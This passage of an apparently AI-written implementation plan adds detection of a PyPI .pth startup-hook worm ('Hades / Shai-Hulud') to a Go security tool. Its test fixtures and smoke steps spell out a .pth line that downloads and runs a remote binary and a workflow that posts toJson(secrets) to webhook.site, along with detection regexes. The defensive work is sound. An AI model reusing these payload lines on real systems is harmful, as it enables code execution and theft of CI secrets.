		{Ref: intel.PackageRef{Ecosystem: intel.EcosystemPyPI, Name: "https://evil/foo.whl"}, OpaqueRemote: true},
	}
	got := selectWheelTargets(direct, nil, false)
	require.Empty(t, got)
}

func TestPthWheelPreflightDisabledShortCircuits(t *testing.T) {
	t.Setenv("VETO_PTH_WHEEL_SCAN", "off")
	refused := pthWheelPreflight(
		zerologNop(), os.Stderr, config{},
		[]packagemanager.Install{ins("ensmallen", "0.8.6", intel.EcosystemPyPI)}, nil,
	)
	require.False(t, refused)
}
```

If `zerologNop` isn't already defined in the package, add it next to the test:

```go
import "github.com/rs/zerolog"

func zerologNop() zerolog.Logger { return zerolog.Nop() }
```

- [ ] **Step 3: Run and commit**

```bash
go build ./... && go test ./cmd/veto/... -run TestPthWheel -count=1 && go test ./cmd/veto/... -run TestSelectWheelTargets -count=1
```

```bash
git add cmd/veto/pth_wheel.go cmd/veto/pth_wheel_test.go
git commit -m "feat(cmd): wheel prescan for Hades .pth worm in Python install hot path"
```

---

## Task 9: Claude Code hook — Python-family `.pth` worm branch

**Files:**
- Modify: `cmd/veto/hook.go`
- Test: `cmd/veto/hook_test.go` (add a test alongside whatever exists; if the file doesn't exist yet, create it)

Add a Python-family check parallel to the existing npm-family `gypWormReasonForTree`. When the hook's analyzer finds a `pip` / `pip3` / `uv` / `pipx` / `poetry` / `pdm` invocation, run `pthPreflightRoots` against the install's effective tree. A worm reason supersedes the usual "re-run with veto" nudge, because prefixing would not make a poisoned environment safe to install into.

- [ ] **Step 1: Add the python-family map + reason wrapper**

Edit `cmd/veto/hook.go`. After `npmFamilyHookPMs` and `isNpmFamilyPM` (the existing block), add a sibling block:

```go
// pythonFamilyHookPMs are the package-manager finding names whose installs
// run inside a Python interpreter / venv — i.e. whose target tree has a
// site-packages and could carry a Hades .pth worm.
var pythonFamilyHookPMs = map[string]struct{}{
	"pip": {}, "pip3": {}, "uv": {}, "pipx": {}, "poetry": {}, "pdm": {}, "uvx": {},
}

func isPythonFamilyPM(pm string) bool {
	_, ok := pythonFamilyHookPMs[pm]
	return ok
}

// pthWormReasonForTree scans the target install tree's site-packages dirs
// for a critical .pth worm match and, if found, returns a hook-shaped deny
// reason. found=false means clean (or scan-error / cwd-unresolvable — all
// non-blocking, mirroring gypWormReasonForTree).
func pthWormReasonForTree(logger zerolog.Logger, pmName string, pmArgs []string) (string, bool) {
	cwd, err := os.Getwd()
	if err != nil {
		logger.Warn().Err(err).Msg("hook .pth check: resolve cwd failed; skipping")
		return "", false
	}
	var buf strings.Builder
	if !pthPreflightRoots(logger, &buf, pthScanRootsForInstall(pmName, pmArgs, cwd)) {
		return "", false
	}
	return "veto-hook: BLOCKED — " + buf.String(), true
}
```

- [ ] **Step 2: Insert the python-family branch into `runClaudeCodeHook`**

Find the block in `cmd/veto/hook.go` (around line 141) that calls `gypWormReasonForTree`. Immediately after that `if isNpmFamilyPM(finding.PM)` block, append a parallel python-family block:

```go
	// Hades / Shai-Hulud .pth startup-hook worm check. Symmetrical to the
	// npm-family branch above: site.py loads a .pth at every interpreter
	// startup, so prefixing the command with `veto` would NOT make a
	// poisoned environment safe to install into — the worm fires before
	// the install completes. Deny directly with the worm reason.
	if isPythonFamilyPM(finding.PM) {
		if reason, found := pthWormReasonForTree(logger, finding.PM, hookPMArgs(finding.Tokens)); found {
			return writeDecisionOrFail(stdout, reason)
		}
	}
```

- [ ] **Step 3: Write a hook integration test**

Append to (or create) `cmd/veto/hook_test.go`:

```go
package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/require"
)

func TestClaudeCodeHookDeniesPipInstallInPoisonedVenv(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	require.NoError(t, os.MkdirAll(site, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(site, "ensmallen-setup.pth"),
		[]byte(`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n"),
		0o644))

	// Run the hook from inside `root` so its cwd-relative venv discovery
	// finds the poisoned venv.
	t.Chdir(root) // requires Go 1.24+; if the project is on <1.24, replace with os.Chdir + t.Cleanup.

	stdin := bytes.NewBufferString(`{"tool_name":"Bash","tool_input":{"command":"pip install ensmallen"}}`)
	var stdout bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), stdin, &stdout)
	require.Equal(t, 0, rc)
	require.True(t, strings.Contains(stdout.String(), "Hades"), "expected Hades in deny reason; got %q", stdout.String())
	require.True(t, strings.Contains(stdout.String(), `"deny"`), "expected deny envelope; got %q", stdout.String())
}
```

(If the project is pre-Go 1.24, replace `t.Chdir(root)` with:

```go
prev, _ := os.Getwd()
require.NoError(t, os.Chdir(root))
t.Cleanup(func() { _ = os.Chdir(prev) })
```

Check `go.mod` for the Go version; use whichever is compatible.)

- [ ] **Step 4: Run and commit**

```bash
go test ./cmd/veto/... -run TestClaudeCodeHookDeniesPipInstall -count=1
```

```bash
git add cmd/veto/hook.go cmd/veto/hook_test.go
git commit -m "feat(hook): Hades .pth worm reason for Python-family installs"
```

---

## Task 10: agentsurface — Hades host-artifact markers

**Files:**
- Modify: `internal/scan/agentsurface/agentsurface.go`
- Test: `internal/scan/agentsurface/agentsurface_test.go`

Add three Hades infection markers to the existing agent-surface scanner: host artifacts in `/tmp` (`/tmp/.bun_ran`, `/tmp/tmp.*.lock`, `_index.js`, out-of-place `bun` binary), local GitHub persistence (rogue `.github/workflows/*.yml` shapes and clones whose remote URL or dir name matches attacker naming), and `sitecustomize.py` / `usercustomize.py` *presence inside `site-packages`* (presence only — no body payload heuristics, per spec Non-goals).

- [ ] **Step 1: Add a Hades targets function alongside `targets()`**

In `internal/scan/agentsurface/agentsurface.go`, append below `targets()`:

```go
// hadesHostTargets returns probe paths for the on-host artifacts the Hades /
// Shai-Hulud PyPI worm drops. Presence of any of these is the signal; we
// stat-check rather than scan, so a missing file is the common case and
// returns silently.
func (s *Scanner) hadesHostTargets() []hadesProbe {
	var probes []hadesProbe
	probes = append(probes,
		hadesProbe{path: "/tmp/.bun_ran", reason: "Hades worm runtime marker"},
		hadesProbe{path: "/tmp/_index.js", reason: "Hades second-stage payload"},
		hadesProbe{path: "/tmp/bun", reason: "Bun runtime dropped in /tmp by Hades worm"},
	)
	if home := s.home; home != "" {
		probes = append(probes,
			hadesProbe{path: filepath.Join(home, ".cache", "bun"), reason: "Bun runtime dropped under ~/.cache by Hades worm"},
		)
	}
	return probes
}

type hadesProbe struct {
	path   string
	reason string
}

// scanHadesHostArtifacts emits a finding per Hades probe path present on the
// host. Stat-only; no file contents are read.
func (s *Scanner) scanHadesHostArtifacts() []scan.Finding {
	var out []scan.Finding
	for _, probe := range s.hadesHostTargets() {
		info, err := os.Stat(probe.path)
		if err != nil {
			continue
		}
		if info.IsDir() {
			// Directory probes (e.g. ~/.cache/bun) only fire when present
			// AND non-empty — an empty dir is unlikely to be the worm.
			entries, _ := os.ReadDir(probe.path)
			if len(entries) == 0 {
				continue
			}
		}
		out = append(out, scan.Finding{
			ID:       fmt.Sprintf("agent-surface:hades-host:%s", probe.path),
			Surface:  scan.SurfaceAgentSurface,
			Severity: scan.SeverityHigh,
			Path:     probe.path,
			Title:    "Hades / Shai-Hulud .pth worm host artifact present",
			Evidence: []scan.Evidence{
				{Label: "owner", Value: "hades"},
				{Label: "reason", Value: probe.reason},
			},
			Remediation: "Verify the artifact is not from the Hades worm; if any Python interpreter recently ran in a poisoned venv, treat reachable credentials as compromised, remove the artifact, and run `veto scan` over all venvs.",
		})
	}
	return out
}

// scanHadesTmpLocks scans /tmp for tmp.*.lock files — the Hades single-
// instance lock shape. Stat-only; we list /tmp once and filter by name.
// /tmp on Linux+macOS is world-readable; on systems where it isn't, the
// listing error is non-fatal.
func (s *Scanner) scanHadesTmpLocks() []scan.Finding {
	entries, err := os.ReadDir("/tmp")
	if err != nil {
		return nil
	}
	var out []scan.Finding
	for _, e := range entries {
		name := e.Name()
		if !strings.HasPrefix(name, "tmp.") || !strings.HasSuffix(name, ".lock") {
			continue
		}
		path := filepath.Join("/tmp", name)
		out = append(out, scan.Finding{
			ID:       "agent-surface:hades-tmp-lock:" + path,
			Surface:  scan.SurfaceAgentSurface,
			Severity: scan.SeverityMedium,
			Path:     path,
			Title:    "/tmp/tmp.*.lock matches Hades worm single-instance lock shape",
			Evidence: []scan.Evidence{
				{Label: "owner", Value: "hades"},
				{Label: "lock", Value: name},
			},
			Remediation: "If no recent legitimate process explains this lock, investigate the owning process and treat as a possible Hades infection.",
		})
	}
	return out
}
```

Wire into `Scan`. Locate the `result.Findings = append(result.Findings, s.scanLaunchdDisabled(ctx)...)` line and add two more siblings immediately after it:

```go
	result.Findings = append(result.Findings, s.scanHadesHostArtifacts()...)
	result.Findings = append(result.Findings, s.scanHadesTmpLocks()...)
```

- [ ] **Step 2: Tests for host-artifact + tmp-lock**

Append to `internal/scan/agentsurface/agentsurface_test.go`:

```go
import (
	"os"
	"path/filepath"
	// existing imports above...
)

func TestScannerSurfacesHadesHostArtifacts(t *testing.T) {
	// We can't reliably create files at /tmp/.bun_ran during a test (CI
	// races, perms), so this test covers the home-dir probe shape which
	// the scanner accepts under an arbitrary `home` root.
	home := t.TempDir()
	bunCache := filepath.Join(home, ".cache", "bun")
	require.NoError(t, os.MkdirAll(bunCache, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(bunCache, "bun"), []byte("x"), 0o755))

	res := agentsurface.New(agentsurface.Options{Home: home}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "Hades / Shai-Hulud .pth worm host artifact present"),
		"missing Hades host-artifact finding; got %v", titles)
}

func containsString(s []string, want string) bool {
	for _, x := range s {
		if x == want {
			return true
		}
	}
	return false
}
```

If `containsString` is already in the file (under another name), reuse it instead of redefining.

- [ ] **Step 3: Run and commit**

```bash
go test ./internal/scan/agentsurface/...
```

```bash
git add internal/scan/agentsurface/agentsurface.go internal/scan/agentsurface/agentsurface_test.go
git commit -m "feat(agentsurface): Hades / Shai-Hulud worm host-artifact markers"
```

---

## Task 11: agentsurface — local GitHub persistence + sitecustomize/usercustomize presence

**Files:**
- Modify: `internal/scan/agentsurface/agentsurface.go`
- Modify: `internal/scan/agentsurface/agentsurface_test.go`

Add two more surfaces to the agent-surface scanner:

1. **Local GitHub persistence**: under each project root, scan `.github/workflows/*.yml` for the worm's secret-exfil-to-webhook shape, and report any directory whose `.git/config` remote URL or directory name matches attacker naming (`stygian-cerberus-*`, `tartarean-charon-*`, `Shai-Hulud`).
2. **`sitecustomize.py` / `usercustomize.py` presence**: surface as `medium` when found inside a `site-packages` directory. Presence-only — no body payload heuristics (per spec Non-goals).

- [ ] **Step 1: Add the worm-naming + workflow regex set**

Append to `internal/scan/agentsurface/agentsurface.go`:

```go
var (
	// hadesAttackerNamingRe matches the Hades / Shai-Hulud worm's
	// attacker-controlled GitHub repo / directory naming.
	hadesAttackerNamingRe = regexp.MustCompile(`(?i)\b(?:Shai-Hulud|stygian-cerberus[-_][A-Za-z0-9._-]+|tartarean-charon[-_][A-Za-z0-9._-]+)\b`)

	// hadesWorkflowExfilRe matches a GitHub Actions workflow that posts to
	// a webhook with environment / secret material in its body — the worm's
	// exfiltration shape. Heuristic, not a parser.
	hadesWorkflowExfilRe = regexp.MustCompile(`(?is)curl\s+[^\n]*-X\s*POST[^\n]*\$\{\{\s*secrets\.|toJson\(\s*secrets\s*\)|webhook\.site|webhooks?\.[A-Za-z0-9.-]+/`)
)

// scanHadesPersistence emits findings for local GitHub persistence under each
// project root: workflow yml files matching the worm's exfil shape, and
// directories whose name / remote URL matches attacker naming.
func (s *Scanner) scanHadesPersistence(ctx context.Context) []scan.Finding {
	var out []scan.Finding
	for _, root := range s.projectRoots {
		if err := ctx.Err(); err != nil {
			return out
		}
		if root == "" {
			continue
		}
		// Directory name match — cheap; check first.
		base := filepath.Base(root)
		if hadesAttackerNamingRe.MatchString(base) {
			out = append(out, finding("hades", root, "attacker-naming", scan.SeverityHigh,
				"Project directory name matches Hades / Shai-Hulud attacker naming",
				"Confirm this clone is intentional. Attacker repos with this naming have been observed staging the Hades PyPI worm.",
				scan.Evidence{Label: "owner", Value: "hades"},
				scan.Evidence{Label: "dir", Value: base},
			))
		}
		// .git/config remote URL match.
		gitCfg, err := os.ReadFile(filepath.Join(root, ".git", "config"))
		if err == nil && hadesAttackerNamingRe.MatchString(string(gitCfg)) {
			out = append(out, finding("hades", filepath.Join(root, ".git", "config"), "attacker-remote", scan.SeverityHigh,
				"Git remote URL matches Hades / Shai-Hulud attacker naming",
				"Inspect the configured remote; if it is not yours, treat any pushed branches as exfiltrated and remove the remote.",
				scan.Evidence{Label: "owner", Value: "hades"},
			))
		}
		// .github/workflows/*.yml exfil-shape match.
		wfDir := filepath.Join(root, ".github", "workflows")
		entries, err := os.ReadDir(wfDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			if !strings.HasSuffix(name, ".yml") && !strings.HasSuffix(name, ".yaml") {
				continue
			}
			path := filepath.Join(wfDir, name)
			content, err := os.ReadFile(path)
			if err != nil {
				continue
			}
			if !hadesWorkflowExfilRe.Match(content) {
				continue
			}
			out = append(out, finding("hades", path, "workflow-exfil", scan.SeverityHigh,
				"GitHub Actions workflow posts secrets to an external webhook (Hades exfil shape)",
				"Inspect the workflow; if it is not yours, delete it, rotate every secret it can read, and audit recent workflow runs.",
				scan.Evidence{Label: "owner", Value: "hades"},
				scan.Evidence{Label: "snippet", Value: snippet(content, hadesWorkflowExfilRe, 200)},
			))
		}
	}
	return out
}

// snippet returns a single-line, length-capped excerpt centered on the first
// match of re inside content, for display in the finding's evidence.
func snippet(content []byte, re *regexp.Regexp, limit int) string {
	loc := re.FindIndex(content)
	if loc == nil {
		return ""
	}
	start := loc[0] - limit/4
	if start < 0 {
		start = 0
	}
	end := start + limit
	if end > len(content) {
		end = len(content)
	}
	frag := strings.Join(strings.Fields(string(content[start:end])), " ")
	if len(frag) > limit {
		frag = frag[:limit] + "…"
	}
	return frag
}

// scanCustomizePresence walks each project root for `sitecustomize.py` or
// `usercustomize.py` files inside a `site-packages` directory and emits a
// medium presence finding. We never read or evaluate the body — these files
// legitimately do real work in some toolchains; their presence-in-site-packages
// is itself the structural signal.
func (s *Scanner) scanCustomizePresence(ctx context.Context) []scan.Finding {
	var out []scan.Finding
	for _, root := range s.projectRoots {
		if err := ctx.Err(); err != nil {
			return out
		}
		_ = filepath.WalkDir(root, func(p string, entry fs.DirEntry, err error) error {
			if err != nil {
				return nil
			}
			if entry.IsDir() {
				if shouldPruneDir(entry.Name()) {
					return fs.SkipDir
				}
				return nil
			}
			name := entry.Name()
			if name != "sitecustomize.py" && name != "usercustomize.py" {
				return nil
			}
			// Only flag when the file sits in a site-packages directory.
			parent := filepath.Base(filepath.Dir(p))
			if parent != "site-packages" && parent != "dist-packages" {
				return nil
			}
			out = append(out, finding("hades", p, "customize-presence", scan.SeverityMedium,
				"Python "+name+" present inside site-packages",
				"Confirm this customize hook is yours. site-packages-resident "+name+" runs at every interpreter startup; verify its body is not an exfil payload.",
				scan.Evidence{Label: "owner", Value: "hades"},
				scan.Evidence{Label: "kind", Value: name},
			))
			return nil
		})
	}
	return out
}
```

Wire both into `Scan`. After the lines added in Task 10:

```go
	result.Findings = append(result.Findings, s.scanHadesPersistence(ctx)...)
	result.Findings = append(result.Findings, s.scanCustomizePresence(ctx)...)
```

You also need the `regexp` import if not already present, and `io/fs` for `fs.SkipDir` — both should already be there.

- [ ] **Step 2: Tests for both surfaces**

Append to `internal/scan/agentsurface/agentsurface_test.go`:

```go
func TestScannerFindsHadesWorkflowExfil(t *testing.T) {
	root := t.TempDir()
	wf := filepath.Join(root, ".github", "workflows", "exfil.yml")
	require.NoError(t, os.MkdirAll(filepath.Dir(wf), 0o755))
	require.NoError(t, os.WriteFile(wf, []byte(`
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST https://webhook.site/abc -d "${{ toJson(secrets) }}"
`), 0o644))

	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "GitHub Actions workflow posts secrets to an external webhook (Hades exfil shape)"),
		"missing exfil finding; got %v", titles)
}

func TestScannerFindsHadesAttackerDirNaming(t *testing.T) {
	parent := t.TempDir()
	root := filepath.Join(parent, "stygian-cerberus-evil")
	require.NoError(t, os.MkdirAll(root, 0o755))
	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "Project directory name matches Hades / Shai-Hulud attacker naming"))
}

func TestScannerFlagsCustomizeInSitePackages(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	require.NoError(t, os.MkdirAll(site, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(site, "sitecustomize.py"), []byte("# anything"), 0o644))

	res := agentsurface.New(agentsurface.Options{ProjectRoots: []string{root}}).Scan(context.Background())
	var titles []string
	for _, f := range res.Findings {
		titles = append(titles, f.Title)
	}
	require.True(t, containsString(titles, "Python sitecustomize.py present inside site-packages"))
}
```

- [ ] **Step 3: Run and commit**

```bash
go test ./internal/scan/agentsurface/...
```

```bash
git add internal/scan/agentsurface/agentsurface.go internal/scan/agentsurface/agentsurface_test.go
git commit -m "feat(agentsurface): Hades persistence (workflow exfil, attacker naming, customize.py presence)"
```

---

## Task 12: `internal/intel/sources/hades` — static stopgap source

**Files:**
- Create: `internal/intel/sources/hades/hades.go`
- Test: `internal/intel/sources/hades/hades_test.go`
- Modify: `cmd/veto/main.go` (case in `buildSource` + import)

A curated static source that returns the known-bad Hades `name@version` records on every Fetch (no HTTP, no cache). Explicitly labelled a stopgap. Wired alongside the existing PyPI sources.

- [ ] **Step 1: Write the source**

Create `internal/intel/sources/hades/hades.go`:

```go
// Package hades is a curated static intel source for the June 2026 Hades /
// Shai-Hulud PyPI worm wave. It is an explicit STOPGAP: the durable defense
// is the pthscan content heuristic, which catches the worm by .pth shape
// even when the (name, version) is brand-new and absent from every other
// feed. This source exists only to shorten the window for the
// already-known names while the worm's tail of compromised versions is
// catalogued elsewhere.
package hades

import (
	"context"

	"github.com/brynbellomy/veto/internal/intel"
)

const sourceID = "hades"

// Source implements intel.Source with a fixed list. Construct via New.
type Source struct{}

var _ intel.Source = (*Source)(nil)

// New builds a Hades stopgap source. No options.
func New() *Source { return &Source{} }

// ID implements intel.Source.
func (s *Source) ID() string { return sourceID }

// Fetch returns the curated Hades report list. Only the PyPI ecosystem is
// covered; other ecosystems get ErrUnsupportedEcosystem.
func (s *Source) Fetch(_ context.Context, eco intel.Ecosystem) ([]intel.MalwareReport, error) {
	if eco != intel.EcosystemPyPI {
		return nil, intel.ErrUnsupportedEcosystem
	}
	out := make([]intel.MalwareReport, 0, len(hadesEntries))
	for _, e := range hadesEntries {
		out = append(out, intel.MalwareReport{
			PackageRef: intel.PackageRef{
				Ecosystem: intel.EcosystemPyPI,
				Name:      e.name,
				Version:   e.version,
			},
			SourceID: sourceID,
			Reason:   "Hades / Shai-Hulud (June 2026) PyPI worm wave (.pth startup-hook). See https://socket.dev/blog and the OSV advisories.",
		})
	}
	return out, nil
}

// hadesEntries is the curated list of known Hades package@versions. Curated by
// hand from the published advisories — versions are exact, not ranges. New
// versions discovered after this commit must be added here AND the underlying
// content heuristic (pthscan) catches them automatically.
var hadesEntries = []struct {
	name    string
	version string
}{
	{"ensmallen", "0.8.6"},
	{"embiggen", "0.11.20"},
	{"pyphetools", "0.13.6"},
	{"gpsea", "0.10.3"},
	{"phenopacket-store-toolkit", "0.1.5"},
	{"ppkt2synergy", "0.0.2"},
}
```

- [ ] **Step 2: Source test**

Create `internal/intel/sources/hades/hades_test.go`:

```go
package hades_test

import (
	"context"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/intel"
	"github.com/brynbellomy/veto/internal/intel/sources/hades"
)

func TestSourceID(t *testing.T) {
	require.Equal(t, "hades", hades.New().ID())
}

func TestFetchPyPIReturnsCuratedSet(t *testing.T) {
	reports, err := hades.New().Fetch(context.Background(), intel.EcosystemPyPI)
	require.NoError(t, err)
	require.NotEmpty(t, reports)
	names := map[string]struct{}{}
	for _, r := range reports {
		require.Equal(t, intel.EcosystemPyPI, r.PackageRef.Ecosystem)
		require.NotEmpty(t, r.PackageRef.Name)
		require.NotEmpty(t, r.PackageRef.Version)
		names[r.PackageRef.Name] = struct{}{}
	}
	_, hasEnsmallen := names["ensmallen"]
	require.True(t, hasEnsmallen)
}

func TestFetchNonPyPIIsSkipped(t *testing.T) {
	_, err := hades.New().Fetch(context.Background(), intel.EcosystemNPM)
	require.ErrorIs(t, err, intel.ErrUnsupportedEcosystem)
}
```

- [ ] **Step 3: Wire into `buildSource` and the default sources list**

In `cmd/veto/main.go`, add the import alongside the other source imports near the top of the file:

```go
"github.com/brynbellomy/veto/internal/intel/sources/hades"
```

In `buildSource`, add a case (placement: alphabetically with the others is fine; before the `default:` arm in any case):

```go
	case "hades":
		return hades.New(), nil
```

In `loadConfig`, append `"hades"` to the default sources slice so it ships on by default:

```go
v.SetDefault("sources", []string{"aikido", "datadog", "openssf", "osv", "pypa", "hades"})
```

- [ ] **Step 4: Run and commit**

```bash
go test ./internal/intel/sources/hades/... && go build ./...
```

```bash
git add internal/intel/sources/hades/hades.go internal/intel/sources/hades/hades_test.go cmd/veto/main.go
git commit -m "feat(intel/hades): static stopgap source for Hades PyPI worm package@versions"
```

---

## Task 13: `veto scan` — wire `scan/pth` into the project surface

**Files:**
- Modify: `cmd/veto/scan.go`

The project sub-scanner currently runs `gyp.New(...)` alongside `project.New(...)`. Add a sibling line for `pth.New(...)`.

- [ ] **Step 1: Add the import and the line**

In `cmd/veto/scan.go`, add the import next to the existing `internal/scan/gyp` import:

```go
"github.com/brynbellomy/veto/internal/scan/pth"
```

Find the line:

```go
		results = append(results, gyp.New(gyp.Options{Roots: roots}).Scan(ctx))
```

Add immediately after:

```go
		// The pth scanner is a content heuristic for the Hades / Shai-Hulud
		// PyPI worm. Like the gyp scanner above it runs alongside the project
		// scanner without needing the intel store: site.py loads .pth files
		// from site-packages at every interpreter startup, so a worm there
		// detonates before any intel lookup could see it.
		results = append(results, pth.New(pth.Options{Roots: roots}).Scan(ctx))
```

- [ ] **Step 2: Smoke-test the scan command**

```bash
go build ./... && go test ./cmd/veto/... -run TestScan -count=1
```

If no `TestScan` exists, just verify the binary builds. End-to-end coverage lives in `internal/scan/pth`.

- [ ] **Step 3: Commit**

```bash
git add cmd/veto/scan.go
git commit -m "feat(cmd/scan): wire pth scanner into veto scan"
```

---

## Task 14: CLI help, doctor, status updates

**Files:**
- Modify: `cmd/veto/main.go` (help text and `doctor` status)

Bring `veto help` / `veto status` / `veto doctor` current with the new source (`hades`), new env var (`VETO_PTH_WHEEL_SCAN`), and the .pth surface. The pattern lives at `cmd/veto/main.go:1580-1600` for env-var docs and similar areas for status. Use `grep` to find each block.

- [ ] **Step 1: Add `VETO_PTH_WHEEL_SCAN` to the help text**

Read the existing env-var help block:

```bash
grep -n 'VETO_GYP_TARBALL_SCAN\|VETO_SOURCES' cmd/veto/main.go
```

Find the help string that documents `VETO_GYP_TARBALL_SCAN` and add a parallel line for `VETO_PTH_WHEEL_SCAN`. Sample line to mirror (use the exact alignment from the surrounding text):

```
VETO_PTH_WHEEL_SCAN  enable / disable the .pth wheel prescan for the Hades
                     PyPI worm. Values: on (default; argv-direct only),
                     full (also fetch resolved transitives), off.
```

- [ ] **Step 2: Mention `hades` in the source-list comment / help**

Find any spot where the source-list default is shown in CLI help. Add `hades` to the listed defaults. The default slice in `loadConfig` already includes it (Task 12).

- [ ] **Step 3: Smoke-build**

```bash
go build ./... && ./veto help 2>&1 | head -40
```

(If `./veto` isn't on PATH, run `go run ./cmd/veto help`.)

- [ ] **Step 4: Commit**

```bash
git add cmd/veto/main.go
git commit -m "docs(cli): bring help/status current with pth wheel prescan + hades source"
```

---

## Task 15: README — `.pth` startup-hook worm detection section

**Files:**
- Modify: `README.md`

Add a `.pth startup-hook worm detection` section under the existing `binding.gyp` worm section, summarising the Hades wave, the three detection points, and the env-var toggle.

- [ ] **Step 1: Locate the gyp section as the anchor**

```bash
grep -n 'phantom-gyp\|binding.gyp worm\|gypscan' README.md
```

- [ ] **Step 2: Append the new section**

After the `binding.gyp` section ends, add:

```markdown
### `.pth` startup-hook worm detection (Hades / Shai-Hulud)

The June 2026 Hades wave is the PyPI branch of the same Miasma lineage veto
fights on npm with `binding.gyp`. It rides a trusted package name (maintainer
account takeover, so the name is not in any malware feed for hours), keeps the
package metadata clean, and ships its payload as a `*-setup.pth` file inside
a wheel. Python's `site` module exec()s every `*.pth` whose first token is
`import` at *every* interpreter startup — so a poisoned environment detonates
the worm on the next `python` call, not just at install time.

veto detects this by content, not name, at four points:

1. **`veto scan`** — walks every `site-packages` / `dist-packages` directory
   under each project root and classifies each `.pth` via the `pthscan`
   content heuristic. Critical findings are the Hades signature; medium
   findings are non-allowlisted executable lines that warrant attention.
2. **Install hot path — existing tree** — before `pip` / `uv` / `poetry` /
   `pdm` runs, veto scans the target venv for `.pth` worms. A critical hit
   refuses the install fail-closed.
3. **Install hot path — incoming wheels** — veto downloads the wheel(s)
   about to be installed with `pip download --no-deps --only-binary :all:`
   (no sdist building; nothing executed), opens each as a zip in memory,
   and inspects every `.pth` inside. Default-on for argv-direct installs;
   set `VETO_PTH_WHEEL_SCAN=full` for resolved transitives, `=off` to
   disable.
4. **Claude Code hook** — a `pip install` / `uv pip install` issued by an
   agent in a poisoned environment is denied at the earliest point, with
   the worm reason instead of the usual "re-run with veto" nudge —
   prefixing would not make the environment safe to install into.

veto also surfaces Hades infection markers via `veto scan`'s agent-surface
sub-scanner: host artifacts (`/tmp/.bun_ran`, `/tmp/tmp.*.lock`, dropped
Bun binaries), local GitHub persistence (`.github/workflows/*.yml` exfil
shapes, clones with attacker naming), and `sitecustomize.py` /
`usercustomize.py` *presence inside `site-packages`*.

The intel store also ships a curated stopgap source (`hades`) carrying the
known Hades package@versions. The durable defense is the `.pth` content
heuristic; the stopgap shortens the window for already-catalogued names.
```

- [ ] **Step 3: Commit**

```bash
git add README.md
git commit -m "docs(readme): .pth startup-hook worm detection (Hades / Shai-Hulud)"
```

---

## Task 16: End-to-end smoke run

**Files:** (no edits — verification only)

- [ ] **Step 1: Full test suite**

```bash
go test ./... -count=1
```

Expected: all green.

- [ ] **Step 2: `veto scan` over a synthesized poisoned tree**

```bash
TMPDIR=$(mktemp -d)
mkdir -p "$TMPDIR/.venv/lib/python3.11/site-packages"
cat > "$TMPDIR/.venv/lib/python3.11/site-packages/ensmallen-setup.pth" <<'EOF'
import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])
EOF
go run ./cmd/veto scan "$TMPDIR" | head -30
```

Expected: a Critical Hades finding for the planted `.pth`.

- [ ] **Step 3: `veto scan` over the worktree itself**

```bash
go run ./cmd/veto scan .
```

Expected: no Hades findings (and no false positives on `setuptools` / editable installs already present in any venvs under `.`).

- [ ] **Step 4: Final commit if anything trivial drifted (formatting, etc.)**

```bash
gofmt -w ./... && go vet ./... && go test ./... -count=1
git status
```

If anything needs touch-up, commit; otherwise stop.

---

## Self-Review

**Spec coverage:**

- Spec §1 "Core detector — `internal/pthscan`": Tasks 1–3.
- Spec §2 "Existing-tree scan — `internal/scan/pth`": Task 6.
- Spec §3a "Install hot path — existing tree": Task 7.
- Spec §3b "Install hot path — incoming wheel prescan": Tasks 4, 5, 8.
- Spec §3c "Claude Code hook (Layer 1)": Task 9.
- Spec §4 "Host-artifact / persistence scan": Tasks 10, 11.
- Spec §5 "Static IOC package list": Task 12.
- Spec "Testing" sub-section: distributed through Tasks 1–12; live false-positive guard explicit in Task 5.
- Spec "Confirmed scope decisions": (1) `sitecustomize.py` presence-only ✓ Task 11; (2) wheels-only ✓ Task 8 uses `--only-binary :all:`; (3) no GitHub account enumeration ✓ Task 11 only walks `ProjectRoots`.
- README + CLI help: Tasks 14, 15.
- End-to-end smoke: Task 16.

**Placeholder scan:** Searched for "TBD", "TODO" outside legitimate descriptive comments, and "implement later". The only non-`@@TODO` token in the plan is the historical `// TODO` referenced in a comment quoting another file. No vague "add appropriate error handling" steps — all steps show concrete code.

**Type consistency:** `pthscan.Inspect(Input) Verdict` is used identically in every caller (Tasks 4, 6, 7). `Severity` rank function is local to both `pthscan` and `wheel` (the latter dups intentionally because rank is private). `Verdict.Flagged()` exists in Task 1 and is called in Tasks 4, 6, 7. `scan.Severity` mapping is consistent across Tasks 6 and 7. `intel.MalwareReport` shape matches what `buildStore` expects (Task 12).

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-06-10-hades-pth-defense.md`. Two execution options:

**1. Subagent-Driven (recommended)** — I dispatch a fresh subagent per task, review between tasks, fast iteration. (Best for a 16-task plan: each task is self-contained and the orchestrator's context stays clean.)

**2. Inline Execution** — Execute tasks in this session using executing-plans, batch execution with checkpoints. (Better if you want to watch every diff land in your terminal.)

Which approach?
